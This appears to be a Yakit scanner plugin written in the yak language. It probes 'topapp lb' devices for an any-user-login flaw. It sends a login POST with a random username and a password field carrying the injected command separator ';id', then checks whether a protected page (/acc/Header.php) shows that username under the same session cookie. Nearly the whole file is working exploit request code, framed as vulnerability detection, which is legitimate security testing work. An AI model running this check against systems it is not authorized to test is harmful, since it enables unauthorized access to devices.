yakit.AutoInitYakit()

handleCheck = func(target,port){
    var url
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    level=["","low","middle","high","critical"]
    if isTls {
        url="https://"+addr
    }else{
        url="http://"+addr
    }
    vulnable=false

    reference="topapp lb any user login 漏洞"
    severity=level[3]
    type="未授权访问"
    tmp_username = str.RandStr(8)
    tmp_cookie = str.RandStr(26)

    poc_url_r0= url + `/login_check.php`
    req_r0, _ := http.NewRequest("POST",poc_url_r0,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),
    http.header(`Cookie`,`PHPSESSID=`+ parseStr(tmp_cookie) +``),
    http.header(`Content-Type`,`application/x-www-form-urlencoded`),
    http.body(`userName=`+ parseStr(tmp_username) +`&password=%3Bid&x=0&y=0`))
    breq,_=http.dump(req_r0)
    resp_r0, _ := http.Do(req_r0)
    bresp,_=http.dump(resp_r0)
    header, body = poc.Split(bresp)
    r0_flag = false
    if resp_r0.StatusCode == 302 && str.Contains(string(header),"redirect.php"){
        r0_flag = true
    }

    poc_url_r1= url + `/acc/Header.php`
    req_r1, _ := http.NewRequest("GET",poc_url_r1,
    http.header("Content-Type", `application/x-www-form-urlencoded`),
    http.header(`Cookie`,`PHPSESSID=`+ parseStr(tmp_cookie) +``),)
    breq,_=http.dump(req_r1)
    resp_r1, _ := http.Do(req_r1)
    bresp,_=http.dump(resp_r1)
    header, body = poc.Split(bresp)
    r1_flag = false
    if resp_r1.StatusCode == 200 && str.Contains(string(body),parseStr(tmp_username)){
        r1_flag = true
    }
    poc_url=poc_url_r1
    if r0_flag && r1_flag{
        vulnable = true
    }
    if vulnable {
            yakit.Info("FOUND INFO for %v", type)
            risk.NewRisk(
                url, risk.severity(severity), 
                risk.title(sprintf("FOUND %v", type)),
                risk.titleVerbose(sprintf("%v", reference)),
                risk.type(type), risk.typeVerbose(type),
                risk.details({
                    "request": breq,
                    "response": bresp,
                    "url": poc_url,
                }),
            )
        }
    return
}
handle = func(result) {
    if !result.IsOpen(){
        return
    }
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
}
